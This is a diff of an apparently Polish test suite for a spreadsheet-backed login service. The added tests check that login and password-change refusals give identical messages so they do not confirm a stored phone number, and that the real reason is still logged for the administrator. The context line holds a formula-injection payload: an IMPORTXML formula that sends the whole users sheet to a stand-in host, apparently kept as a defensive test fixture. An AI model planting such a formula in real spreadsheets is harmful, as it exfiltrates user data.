@@ -80,7 +80,13 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 {
   const B = swiezy();
   ok('logowanie hasłem', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).imie === 'Jan Testowy');
-  ok('konto z hasłem nie wpuszcza telefonem', /ustawione haslo/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).opis));
+  ok('konto z hasłem nie wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).status === 'blad');
+  ok('telefon z kartoteki na koncie z hasłem dostaje ten sam komunikat co zły numer i złe hasło (odpowiedź nie potwierdza numeru)', (() => {
+    const o = ['600100200', '600100201', 'zlehaslo'].map(h => B.post({ akcja: 'logowanie', kod: '12345', haslo: h }));
+    const z = ['600100200', '600100201', 'zlehaslo'].map(h => B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: h, nowe_haslo: 'przejete123' }));
+    return o.every(x => x.status === 'blad' && x.opis === o[0].opis) && /Nieprawidlowe haslo/.test(o[0].opis) && z.every(x => x.status === 'blad' && x.opis === z[0].opis); })());
+  ok('…a w Log zostaje prawdziwy powód odmowy zmiany hasła (dla administratora)', B.get('Log').w.some(r => r[2] === 'zmiana_hasla' && /telefon zamiast hasla/.test(r[3])));
+  B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' });      // zeruje licznik prób po powyższych
   ok('konto bez hasła wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).status === 'ok');
   ok('logowanie mówi, czym weszło (klient zakłada sejf tą samą postacią hasła)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).przez === 'haslo' && B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).przez === 'telefon');
   ok('każda odpowiedź, także odmowa, niesie czas serwera (poprawka zegara urządzenia)', [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }), B.post({ akcja: 'nieznana', kod: '12345' }), B.post({ akcja: 'puls', kod: '12345' })].every(o => Math.abs(o.czas_serwera - Date.now() / 1000) < 5));
